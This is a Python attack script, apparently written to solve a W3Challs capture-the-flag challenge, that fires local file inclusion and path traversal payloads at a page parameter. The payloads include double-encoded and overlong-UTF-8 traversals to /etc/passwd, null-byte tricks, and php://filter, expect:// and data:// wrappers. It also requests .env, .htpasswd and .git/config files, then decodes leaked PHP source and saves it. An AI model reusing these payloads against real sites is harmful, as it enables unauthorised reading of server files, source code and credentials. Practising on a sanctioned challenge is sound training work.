#!/usr/bin/env python3
import requests
import base64
import urllib.parse

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] Testing advanced path restriction bypasses...")

# The hint says there are path restrictions - let's bypass them
# Likely checking for ../ or certain strings

bypass_techniques = [
    # Double URL encoding
    ("..%252f..%252f..%252fetc%252fpasswd", "double URL encoding"),
    ("..%252flogin", "double encoded login"),
    ("..%252fmember", "double encoded member"),
    
    # Unicode/UTF-8 encoding tricks
    ("..%c0%af..%c0%afetc%c0%afpasswd", "overlong UTF-8"),
    (".%c0%ae/.%c0%ae/etc/passwd", "overlong UTF-8 dots"),
    
    # Case variations (PHP on Windows)
    ("..%2F..%2Fetc%2Fpasswd", "uppercase encoding"),
    
    # Backslash variations
    ("..\\..\\etc\\passwd", "backslash"),
    ("..%5c..%5cetc%5cpasswd", "encoded backslash"),
    
    # Current directory tricks
    ("./../login", "current dir prefix"),
    ("././../login", "multiple current dir"),
    
    # Absolute path attempts
    ("/etc/passwd", "absolute path"),
    ("//etc/passwd", "double slash"),
    
    # PHP specific
    ("php://filter/resource=login", "PHP filter without encoding"),
    ("php://filter/resource=member", "PHP filter member"),
    ("php://filter/resource=/etc/passwd", "PHP filter absolute"),
    
    # Interesting files to try
    (".htaccess", "htaccess"),
    (".htpasswd", "htpasswd"),
    ("wp-config", "wp-config"),
    (".git/config", "git config"),
    (".env", "env file"),
    
    # Try without extension
    ("login.", "login with dot"),
    ("member.", "member with dot"),
    ("admin.", "admin with dot"),
    
    # Try with fake extension that gets stripped
    ("login.php", "login.php"),
    ("member.php", "member.php"),
    ("admin.php", "admin.php"),
    
    # Path with nullbyte and extension
    ("login%00.php", "login null php"),
    ("member%00.php", "member null php"),
    
    # Try to break the include with special chars
    ("login\n", "login with newline"),
    ("login\r", "login with carriage return"),
    ("login\t", "login with tab"),
    
    # PHP stream wrappers
    ("expect://id", "expect wrapper"),
    ("data://text/plain,<?php phpinfo();", "data wrapper"),
    ("phar://test.phar", "phar wrapper"),
    
    # Try accessing files directory
    ("files/style.css", "files directory css"),
    ("files/logo.png", "files directory png"),
    ("files/../login", "files parent login"),
    ("../files/login", "parent files login"),
]

for payload, description in bypass_techniques:
    url = f"{base}index.php?page={payload}"
    r = s.get(url)
    
    # Check for interesting responses
    interesting = False
    
    if 'root:' in r.text:
        print(f"[!!!] /etc/passwd FOUND with {description}: {payload}")
        interesting = True
    elif '<?php' in r.text:
        print(f"[!!!] PHP CODE EXPOSED with {description}: {payload}")
        interesting = True
    elif 'password' in r.text.lower() and 'welcome' not in r.text.lower():
        print(f"[!] Password field found with {description}: {payload}")
        interesting = True
    elif len(r.text) < 1000 and len(r.text) > 100:
        print(f"[+] Small response ({len(r.text)} bytes) with {description}: {payload}")
        interesting = True
    elif 'Warning:' in r.text or 'Fatal' in r.text:
        print(f"[!] PHP Error with {description}: {payload}")
        errors = [line for line in r.text.split('\n') if 'Warning' in line or 'Fatal' in line]
        for error in errors[:2]:
            print(f"    {error[:150]}")
        interesting = True
    
    if interesting and len(r.text) < 5000:
        # Extract the corps content
        import re
        corps_match = re.search(r'<div id="corps">(.*?)</div>', r.text, re.DOTALL)
        if corps_match:
            content = corps_match.group(1).strip()
            if content and 'Welcome to' not in content:
                print(f"    Corps content: {content[:200]}")

# Test if we can read the index.php source
print("\n[*] Attempting to read index.php source...")

source_attempts = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=./index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "php://filter/convert.base64-encode/resource=index",
    "index.phps",
    "index.php.bak",
    "index.php~",
    "index.php.old",
    "index.php.save",
]

for attempt in source_attempts:
    url = f"{base}index.php?page={attempt}"
    r = s.get(url)
    
    # Look for base64
    import re
    b64_pattern = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', r.text)
    for b64 in b64_pattern:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if '<?php' in decoded or 'include' in decoded.lower():
                print(f"[!!!] SOURCE CODE FOUND with {attempt}")
                print(decoded[:500])
                with open("/workspace/index_source.txt", "w") as f:
                    f.write(decoded)
                break
        except:
            pass

# Try to find other PHP files
print("\n[*] Looking for other PHP files...")

other_files = [
    "config", "database", "db", "conn", "connection",
    "auth", "authenticate", "check", "validate",
    "session", "user", "users", "member", "members",
    "admin", "administrator", "panel", "dashboard",
    "include", "includes", "inc", "common", "functions",
    "init", "bootstrap", "setup", "install",
    "api", "ajax", "process", "action",
    "secret", "flag", "key", "token"
]

for file in other_files:
    # Try with PHP filter
    url = f"{base}index.php?page=php://filter/convert.base64-encode/resource={file}"
    r = s.get(url)
    
    b64_pattern = re.findall(r'[A-Za-z0-9+/]{50,}={0,2}', r.text)
    for b64 in b64_pattern:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if '<?php' in decoded:
                print(f"[!!!] Found PHP file: {file}")
                print(f"  First 200 chars: {decoded[:200]}")
                with open(f"/workspace/{file}_source.txt", "w") as f:
                    f.write(decoded)
                break
        except:
            pass